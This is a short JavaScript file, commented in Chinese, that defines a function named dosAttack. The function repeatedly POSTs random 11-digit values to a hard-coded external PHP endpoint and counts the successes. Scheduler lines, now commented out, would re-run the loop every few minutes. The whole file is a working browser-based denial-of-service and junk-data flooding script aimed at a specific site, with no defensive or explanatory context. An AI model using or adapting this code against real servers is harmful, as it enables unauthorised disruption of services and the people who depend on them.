//http://0317love.com/gprs.php

//加载Jquery CDN 
document.write("<script src=\"//cdn.bootcss.com/jquery/3.0.0-alpha1/jquery.js\"></script>");
//等待Jquery完成初始化，先执行一次
//setTimeout(dosAttack, 3000);
//setInterval(dosAttack, 60000 * 3);
var count = 1;
var success = 0;
function dosAttack(){
 
 for(; ; count++){
   var random = 1 + ("" + Math.random()).substring(2,12);
   //利用getJSONk跨域访问
   //$.getJSON("http://0317love.com/gprs.php?jsoncallback=?", "m=" + random, function(data){
   $.post("http://0317love.com/gprs.php", "m=" + random, function(data){
      success++;
      if(success % 100 == 0){
    	  console.info("success : " + success);
      }
      
   })

   //无回调
   //$.post("gprs.php", "m=" + random);   

  if(count % 100 == 0){
     console.log(count + " " + random);
  }

  if(count % 5 == 0){
     count++;
     break;
  }
 }
 console.log("******end********");
}